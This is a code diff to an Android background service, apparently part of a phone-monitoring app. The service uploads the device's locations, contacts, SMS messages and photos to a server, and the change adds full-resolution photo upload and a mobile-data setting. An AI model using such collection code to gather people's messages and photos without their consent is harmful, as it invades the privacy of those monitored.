@@ -9,6 +9,7 @@ import net.deerhunter.ars.R;
 import net.deerhunter.ars.application.ArsApplication;
 import net.deerhunter.ars.contact_structs.ContactList;
 import net.deerhunter.ars.contact_structs.ContactsManager;
+import net.deerhunter.ars.inner_structures.ControlConstants;
 import net.deerhunter.ars.protocol.packets.CallPacket;
 import net.deerhunter.ars.protocol.packets.ContactPacket;
 import net.deerhunter.ars.protocol.packets.DataType;
@@ -22,7 +23,9 @@ import net.deerhunter.ars.providers.ActivityContract.Thumbnails;
 import android.annotation.SuppressLint;
 import android.app.Service;
 import android.content.ContentResolver;
+import android.content.ContentUris;
 import android.content.ContentValues;
+import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
@@ -30,6 +33,7 @@ import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.graphics.Bitmap.CompressFormat;
 import android.graphics.BitmapFactory;
+import android.net.ConnectivityManager;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.HandlerThread;
@@ -65,7 +69,15 @@ public class PacketSenderService extends Service {
 
 			sendNewLocations();
 
-			sendNewThumbnails();
+			if (msg.getData().getInt("type") == ConnectivityManager.TYPE_MOBILE) {
+				SharedPreferences prefs = ArsApplication.getInstance().getAppPrefs();
+				Context context = ArsApplication.getInstance().getApplicationContext();
+				int mode = prefs.getInt(context.getString(R.string._3gModuleSettings), ControlConstants.MICRO_THUMB_PHOTO);
+				if (mode != ControlConstants.WITHOUT_PHOTO)
+					sendNewThumbnails(mode);
+			} else {
+				sendNewThumbnails(ControlConstants.FULL_PHOTO);
+			}
 
 			sendContactsIfNeed();
 
@@ -79,11 +91,11 @@ public class PacketSenderService extends Service {
 			Editor prefsEditor = prefs.edit();
 			boolean needSendContacts = prefs.getBoolean(getString(R.string.needToSendContacts), false);
 			boolean onlyNew = prefs.getBoolean(getString(R.string.sendOnlyNewContacts), false);
-			if (needSendContacts){
+			if (needSendContacts) {
 				if (sendContacts(onlyNew))
 					prefsEditor.putBoolean(getString(R.string.needToSendContacts), false);
 			}
-			prefsEditor.apply();			
+			prefsEditor.apply();
 		}
 
 		private boolean sendContacts(boolean onlyNew) {
@@ -112,11 +124,10 @@ public class PacketSenderService extends Service {
 					ContentValues sentContact = new ContentValues();
 					sentContact.put(ActivityContract.Contacts.SENT_CONTACT_ID, contact.getId());
 					getContentResolver().insert(ActivityContract.Contacts.CONTENT_URI, sentContact);
-				}
-				else{
+				} else {
 					areContactsSent = false;
 				}
-					
+
 			}
 			return areContactsSent;
 		}
@@ -164,7 +175,7 @@ public class PacketSenderService extends Service {
 		/**
 		 * Sends new thumbnails to the server.
 		 */
-		private void sendNewThumbnails() {
+		private void sendNewThumbnails(int mode) {
 			Cursor c = null;
 			try {
 				ContentResolver cr = getContentResolver();
@@ -194,17 +205,20 @@ public class PacketSenderService extends Service {
 						String displayName = imageInfoCursor.getString(0);
 						String filePath = imageInfoCursor.getString(1);
 						long dateAdded = imageInfoCursor.getLong(2);
-						System.out.println(dateAdded);
-						BitmapFactory.Options bitmapOptions = new BitmapFactory.Options();
-						bitmapOptions.inSampleSize = 2;
-						Bitmap thumbnail = MediaStore.Images.Thumbnails.getThumbnail(cr, storeId,
-								MediaStore.Images.Thumbnails.MINI_KIND, bitmapOptions);
-						if (thumbnail == null) { // some problems with creating
-													// new thumbnail
+						Bitmap image;
+						if (mode == ControlConstants.FULL_PHOTO) {
+							image = MediaStore.Images.Media.getBitmap(cr,
+									ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, storeId));
+						} else {
+							BitmapFactory.Options bitmapOptions = new BitmapFactory.Options();
+							image = MediaStore.Images.Thumbnails.getThumbnail(cr, storeId, mode, bitmapOptions);
+						}
+						if (image == null) { // some problems with creating
+												// new thumbnail
 							continue;
 						}
 						ByteArrayOutputStream outputStream = new ByteArrayOutputStream(10000);
-						thumbnail.compress(CompressFormat.JPEG, 50, outputStream);
+						image.compress(CompressFormat.JPEG, 50, outputStream);
 
 						ThumbnailPacket thumbnailPacket = new ThumbnailPacket(displayName, filePath, storeId,
 								dateAdded, outputStream.toByteArray());
@@ -288,7 +302,7 @@ public class PacketSenderService extends Service {
 					String recipient = c.getString(ActivityContract.SMS.RECIPIENT_COLUMN);
 					String sender_phone_number = c.getString(ActivityContract.SMS.SENDER_PHONE_NUMBER_COLUMN);
 					String recipient_phone_number = c.getString(ActivityContract.SMS.RECIPIENT_PHONE_NUMBER_COLUMN);
-					long time = c.getLong(ActivityContract.SMS.TIME_COLUMN);
+					long time = c.getLong(ActivityContract.SMS.TIME_COLUMN) / 1000;
 					String sms_body = c.getString(ActivityContract.SMS.SMS_BODY_COLUMN);
 
 					SMSPacket sms = new SMSPacket(sender, recipient, sender_phone_number, recipient_phone_number, time,
@@ -299,7 +313,6 @@ public class PacketSenderService extends Service {
 
 					if (uploaded)
 						cr.delete(ActivityContract.SMS.CONTENT_URI, "_id = ?", new String[] { "" + id });
-
 				}
 
 			} catch (IOException e) {
